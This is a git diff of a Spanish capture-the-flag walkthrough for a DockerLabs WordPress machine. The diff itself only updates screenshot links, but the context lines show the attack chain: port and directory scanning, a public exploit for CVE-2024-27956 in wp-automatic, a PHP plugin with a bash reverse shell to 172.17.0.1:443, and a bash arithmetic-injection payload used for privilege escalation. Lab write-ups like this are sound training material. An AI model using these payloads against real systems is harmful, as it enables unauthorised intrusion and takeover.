@@ -5,11 +5,11 @@ Lo primero que deberemos de hacer será escanear los posibles puertos que se enc
 ```shell 
 nmap -p- --open -sS -sC -sV -vvv --min-rate 5000 -Pn 172.17.0.2
 ```
-![NMAP](https://github.com/Isma-yo/Write-Ups-DockerLabs/blob/main/Maquina%20Master/photos/foto.png)
+![NMAP](https://github.com/Isma-yo/photos/blob/main/Master/foto.png)
 
 Vemos que únicamente tiene abierto un puerto, el 80, por lo que vamos a ver que hay en la página web:
 
-![HOME](https://github.com/Isma-yo/Write-Ups-DockerLabs/blob/main/Maquina%20Master/photos/foto2.png)
+![HOME](https://github.com/Isma-yo/photos/blob/main/Master/foto2.png)
 
 No hay mucha cosa interesante, en el código fuente tampoco encontramos nada, sin embargo, podemos observar en la parte de abajo que nos dice que está utilizando wp-automatic 3.92.0, tendremos esto en cuenta ya que nos servirá en un futuro. Al no encontrar nada relevante realizaremos fuzzing web con gobuster:
 
@@ -17,19 +17,19 @@ No hay mucha cosa interesante, en el código fuente tampoco encontramos nada, si
 gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
 ```
 
-![GOBUSTER](https://github.com/Isma-yo/Write-Ups-DockerLabs/blob/main/Maquina%20Master/photos/foto3.png)
+![GOBUSTER](https://github.com/Isma-yo/photos/blob/main/Master/foto3.png)
 
 Vemos que cuenta con un wordpress (lo podíamos deducir por el wp-automatic de antes también). Si nos poníamos encima de alguno de los diferentes cursos que había veíamos que había un usuario “Mario”, por lo que lo normal sería intentar obtener su contraseña y entrar al panel de administración de Wordpress, os adelanto que no es la solución ya que lo intente y no conseguí obtener su contraseña.
 
 Ahora es cuando entra en juego el wp-automatic de antes, si buscamos información acerca de esta versión en google acompañado de la palabra exploit vemos esto:
 
-![WEB](https://github.com/Isma-yo/Write-Ups-DockerLabs/blob/main/Maquina%20Master/photos/foto4.png)
+![WEB](https://github.com/Isma-yo/photos/blob/main/Master/foto4.png)
 
 https://thehackernews.com/2024/04/hackers-exploiting-wp-automatic-plugin.html
 
 Si accedemos a la web vemos que aparece un CVE que puede que podamos utilizar:
 
-![WEB2](https://github.com/Isma-yo/Write-Ups-DockerLabs/blob/main/Maquina%20Master/photos/foto5.png)
+![WEB2](https://github.com/Isma-yo/photos/blob/main/Master/foto5.png)
 
 Si buscamos el CVE en Google vemos que hay un exploit en github, así que vamos a probar si funciona:
 
@@ -37,17 +37,17 @@ https://github.com/diego-tella/CVE-2024-27956-RCE
 
 Si seguimos los pasos que nos indica vemos que tras ejecutar el exploit nos crea un usuario con nombre “eviladmin” y con contraseña “admin”:
 
-![CVE](https://github.com/Isma-yo/Write-Ups-DockerLabs/blob/main/Maquina%20Master/photos/foto6.png)
+![CVE](https://github.com/Isma-yo/photos/blob/main/Master/foto6.png)
 
 Intentamos acceder con el usuario que nos ha creado el exploit y ole, ya estamos dentro del panel de administración. Ahora vamos a intentar subir una reverse shell en forma de plugin:
 
-![WP](https://github.com/Isma-yo/Write-Ups-DockerLabs/blob/main/Maquina%20Master/photos/foto7.png)
+![WP](https://github.com/Isma-yo/photos/blob/main/Master/foto7.png)
 
-![WP2](https://github.com/Isma-yo/Write-Ups-DockerLabs/blob/main/Maquina%20Master/photos/foto8.png)
+![WP2](https://github.com/Isma-yo/photos/blob/main/Master/foto8.png)
 
 Una vez aquí vemos que unicamente nos deja subir archivos con extensión .zip, por lo que vamos a investigar como poder subir una reverse shell en .zip a un wordpress:
 
-![WEB3](https://github.com/Isma-yo/Write-Ups-DockerLabs/blob/main/Maquina%20Master/photos/foto9.png)
+![WEB3](https://github.com/Isma-yo/photos/blob/main/Master/foto9.png)
 
 https://sevenlayers.com/index.php/179-wordpress-plugin-reverse-shell
 
@@ -67,15 +67,15 @@ exec("/bin/bash -c 'bash -i >& /dev/tcp/172.17.0.1/443 0>&1'");
 ?>
 ```
 
-![ZIP](https://github.com/Isma-yo/Write-Ups-DockerLabs/blob/main/Maquina%20Master/photos/foto10.png)
+![ZIP](https://github.com/Isma-yo/photos/blob/main/Master/foto10.png)
 
 Una vez tenemos el archivo en .zip vamos a intentar subirlo a ver que ocurre:
 
-![PLUGIN](https://github.com/Isma-yo/Write-Ups-DockerLabs/blob/main/Maquina%20Master/photos/foto11.png)
+![PLUGIN](https://github.com/Isma-yo/photos/blob/main/Master/foto11.png)
 
 Vemos que se ha subido correctamente y que nos da la opción de activarlo, antes de activarlo debemos de ponernos en escucha por el puerto que hayamos configurado para poder recibir la reverse shell:
 
-![PLUGIN](https://github.com/Isma-yo/Write-Ups-DockerLabs/blob/main/Maquina%20Master/photos/foto12.png)
+![PLUGIN](https://github.com/Isma-yo/photos/blob/main/Master/foto12.png)
 
 Ya estamos dentro de la máquina, por lo que primero que debermeos de hacer será realizar un tratamiento de la tty:
 
@@ -116,11 +116,8 @@ Una vez lo ejecutamos nos convertimos en el usuario pylon, ahora repetimos el pr
 ```shell
 a[$(/bin/bash >&2)]
 ```
-![EP](https://github.com/Isma-yo/Write-Ups-DockerLabs/blob/main/Maquina%20Master/photos/foto13.png)
+![EP](https://github.com/Isma-yo/photos/blob/main/Master/foto13.png)
 
 Y ahí esta, somos el usuario mario. Ahora si ejecutamos de nuevo sudo -l vemos que podemos ejecutar otro script como root, ese script también nos pide un parámetro por lo que vamos a intentar reutilizar lo mismo que hemos hecho antes para obtener la escalada:
 
-![EP2](https://github.com/Isma-yo/Write-Ups-DockerLabs/blob/main/Maquina%20Master/photos/foto14.png)
-
-![EP7](https://github.com/Isma-yo/photos/blob/main/Activado.jpg)
-
+![EP2](https://github.com/Isma-yo/photos/blob/main/Master/foto14.png)
